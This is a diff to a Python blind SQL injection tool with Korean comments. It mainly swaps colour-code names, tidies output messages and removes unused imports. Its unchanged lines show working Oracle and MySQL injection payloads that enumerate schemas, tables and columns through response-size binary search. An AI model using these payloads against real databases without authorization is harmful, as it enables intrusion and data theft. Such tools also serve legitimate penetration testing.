@@ -6,8 +6,6 @@ import warnings
 import argparse
 import sqlite3
 import json
-import platform
-import ctypes
 from time import sleep
 
 warnings.filterwarnings('ignore')
@@ -75,10 +73,10 @@ class Colors:
     CYAN = "\033[0;36m"
     LIGHT_GRAY = "\033[0;37m"
     DARK_GRAY = "\033[1;30m"
-    LIGHT_RED = "\033[1;31m"
+    LIGHT_BLUE = "\033[1;31m"
     LIGHT_GREEN = "\033[1;32m"
     YELLOW = "\033[1;33m"
-    LIGHT_BLUE = "\033[1;34m"
+    LIGHT_RED = "\033[1;34m"
     LIGHT_PURPLE = "\033[1;35m"
     LIGHT_CYAN = "\033[1;36m"
     LIGHT_WHITE = "\033[1;37m"
@@ -127,7 +125,7 @@ class ArgumentProcessor:
             parser.error("[-] Error: -dbms 옵션은 데이터베이스 유형을 지정해야합니다. 자세한 내용은 -HELP를 사용하십시오.")
         if not (options.basic or options.dbs or (options.tables and options.select_db) or 
                 (options.columns and options.select_db and options.select_table)):
-            parser.error("[-] Error: 다음 옵션 중 하나 이상을 지정해야합니다. -기본, -dbs, -테이블, -컬럼. "
+            parser.error("[-] Error: 다음 옵션 중 하나 이상을 지정해야합니다. -basic, -dbs, -tables, -columns. "
                          "사용 -자세한 정보는 help.")
 
         return options
@@ -276,7 +274,7 @@ class BlindSQLInjector:
                     data = json.loads(data_string)  #JSON 바디를 구문 분석
                     condition = self.url_decode(data[self.args.parameter])
                 except json.JSONDecodeError:
-                    print(f"{Colors.LIGHT_RED}[-] JSON parsing error occurred{Colors.END}")
+                    print(f"{Colors.LIGHT_BLUE}[-] JSON parsing error occurred{Colors.END}")
                     sys.exit(1)
             else:
                 for param in data_string.split("&"):
@@ -303,7 +301,7 @@ class BlindSQLInjector:
 
         if dbms == 'oracle':
             if self.args.basic:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE Basic Information Extraction{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Basic Information Extraction {Colors.END}\n")
                 payloads = {
                     'Version': {
                         'count': "",
@@ -317,7 +315,7 @@ class BlindSQLInjector:
                     },
                 }
             elif self.args.dbs:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE Database Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Database Enumeration {Colors.END}\n")
                 payloads = {
                     'Dbs': {
                         'count': "(SELECT count(*) FROM (SELECT DISTINCT owner FROM all_tables))>{mid_val}",
@@ -326,7 +324,7 @@ class BlindSQLInjector:
                     }
                 }
             elif self.args.tables:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE Table Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Table Enumeration {Colors.END}\n")
                 payloads = {
                     'Tables': {
                         'count': "(SELECT count(*) FROM all_tables WHERE owner='{select_db}')>{mid_val}",
@@ -335,7 +333,7 @@ class BlindSQLInjector:
                     }
                 }
             elif self.args.columns:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] ORACLE Column Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} ORACLE Column Enumeration {Colors.END}\n")
                 payloads = {
                     'Columns': {
                         'count': "(SELECT count(*) FROM all_tab_columns WHERE owner='{select_db}' AND table_name='{select_table}')>{mid_val}",
@@ -346,7 +344,7 @@ class BlindSQLInjector:
                 
         elif dbms == 'mysql':
             if self.args.basic:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL Basic Information Extraction{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Basic Information Extraction {Colors.END}\n")
                 payloads = {
                     'Version': {
                         'count': "",
@@ -360,7 +358,7 @@ class BlindSQLInjector:
                     },
                 }
             elif self.args.dbs:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL Database Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Database Enumeration {Colors.END}\n")
                 payloads = {
                     'Dbs': {
                         'count': "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
@@ -369,7 +367,7 @@ class BlindSQLInjector:
                     }
                 }
             elif self.args.tables:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL Table Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Table Enumeration {Colors.END}\n")
                 payloads = {
                     'Tables': {
                         'count': "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
@@ -378,7 +376,7 @@ class BlindSQLInjector:
                     }
                 }
             elif self.args.columns:
-                print(f"{Colors.LIGHT_RED}{Colors.UNDERLINE}[*] MySQL Column Enumeration{Colors.END}\n")
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} MySQL Column Enumeration {Colors.END}\n")
                 payloads = {
                     'Columns': {
                         'count': "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
@@ -434,7 +432,7 @@ class BlindSQLInjector:
                 self.false_message_size = len(response.content)
                 
         except requests.exceptions.RequestException as e:
-            print(f"{Colors.LIGHT_RED}[-] Connection error: {e}{Colors.END}")
+            print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
             sys.exit(1)
 
     def send_request(self, data_val):
@@ -475,7 +473,7 @@ class BlindSQLInjector:
             return self.false_message_size != check_message_size
             
         except requests.exceptions.RequestException as e:
-            print(f"{Colors.LIGHT_RED}[-] Connection error: {e}{Colors.END}")
+            print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
             return False
 
     def binary_search(self, min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, 
@@ -546,8 +544,8 @@ class BlindSQLInjector:
             else:
                 row_count = 1
                 
-            print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}'{Colors.END} {Colors.LIGHT_PURPLE}Count: {str(row_count)}{Colors.END}" 
-                  if select_table_one else f"{Colors.LIGHT_BLUE}[*] Record count: {str(row_count)}{Colors.END}")
+            print(f"{Colors.GREEN}[*] '{select_table_one}' Count: {str(row_count)}{Colors.END}" 
+                  if select_table_one else f"{Colors.GREEN}[*] Record count: {str(row_count)}{Colors.END}")
 
             # 각 행을 처리
             for rows in range(0, row_count):
@@ -574,7 +572,7 @@ class BlindSQLInjector:
                             self.db_manager.store_result(data_type, name_str, self.args.select_db, select_table_one, key)
                             
                             result_tmp.append(name_str)
-                            print(f"[*] {result_tmp}")
+                            print(f"[+] ['{name_str}']")
 
                 # 형식 및 최종 결과를 저장
                 if self.args.basic:
@@ -582,27 +580,31 @@ class BlindSQLInjector:
                     for name in name_tmp:
                         result_data[name] = result_tmp[num]
                         num += 1
-                    print(f"{Colors.LIGHT_BLUE}[*] {Colors.END}{Colors.GREEN}{result_data}{Colors.END}")
+                    print(f"{Colors.LIGHT_RED}[+] {Colors.END}{Colors.GREEN}{result_data}{Colors.END}")
                 else:
                     if select_table_one:
                         result_data[select_table_one] = result_tmp
                     else:
                         result_data[list(name_tmp)[0]] = result_tmp
-                    print(f"{Colors.LIGHT_BLUE}[*] '{select_table_one}' {Colors.END}: {Colors.GREEN}{result_data[select_table_one]}{Colors.END}" 
-                          if select_table_one else f"{Colors.LIGHT_BLUE}[*] '{list(name_tmp)[0]}' data: {result_data[list(name_tmp)[0]]}{Colors.END}")
-                    
+
+            if select_table_one:
+                print(f"{Colors.LIGHT_RED}[+] '{select_table_one}': {result_data[select_table_one]}{Colors.END}")
+            else:
+                first_name = list(name_tmp)[0]
+                print(f"{Colors.LIGHT_RED}[+] '{first_name}' data: {result_data[first_name]}{Colors.END}")
+                                        
                 result_tmp = []  # 다음 테이블에 대한 재설정
 
         # 최종 결과를 표시
-        print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}{Colors.UNDERLINE}[*] Final Results{Colors.END}")
+        print(f"\n{Colors.LIGHT_BLUE}[+] Final Results{Colors.END}")
         for key, value in result_data.items():
-            print(f"{Colors.LIGHT_BLUE}{key}{Colors.END}: {Colors.GREEN}{value}{Colors.END}")
-        print(f"\n{Colors.LIGHT_RED}[*] SQLite storage complete!{Colors.END}\n")
+            print(f"{Colors.LIGHT_RED}{key}: {value}{Colors.END}")
+        print(f"\n{Colors.LIGHT_BLUE}[+] SQLite storage complete!{Colors.END}\n")
 
 def main():
-    print(f"\n{Colors.LIGHT_RED}{Colors.BOLD}=================================================================={Colors.END}")
-    print(f"{Colors.LIGHT_RED}{Colors.BOLD}                    Blind SQL Injection Tool                    {Colors.END}")
-    print(f"{Colors.LIGHT_RED}{Colors.BOLD}=================================================================={Colors.END}\n")
+    print(f"\n{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}")
+    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}                    Blind SQL Injection Tool                    {Colors.END}")
+    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}\n")
     
     # 프로세스 인수
     arg_processor = ArgumentProcessor()
